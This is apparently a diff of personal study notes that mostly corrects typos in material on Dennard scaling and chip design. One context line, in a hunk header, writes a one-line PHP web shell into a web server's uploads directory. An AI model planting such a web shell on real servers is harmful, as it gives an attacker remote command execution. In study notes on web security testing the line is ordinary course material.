@@ -22,16 +22,15 @@ echo "<?php system($_GET[\"cmd\"]); ?>" > /var/www/html/uploads/temp_4A4D.php
 
 Using BurpSuite
 
-
 Dennard Scaling
-Scale transistor dimensinos and oeprating voltage by a factor lambda
+Scale transistor dimensions and oeprating voltage by a factor lambda
 Gate delay scles as lambda
 
 Clock frequency scales as 1/delay
 
-Energy per signal transistions cales as lambda^3
-POwer is energy over time. Power scaes as lambda^2
-Number of devices on a chip scsales as lambda ^-2
+Energy per signal transitions scales as lambda^3
+Power is energy over time. Power scales as lambda^2
+Number of devices on a chip scales as lambda ^-2
 
 Power density, watts per centimer is constant
 
@@ -57,8 +56,6 @@ Transistor is tool small for doping to work righ, There arent enough aoms
 
 
 Scaling:
-
-
 
 Better than silicon:
 - Chiplets - many smaller chhips on single ceramic, M series CPU, GPUS
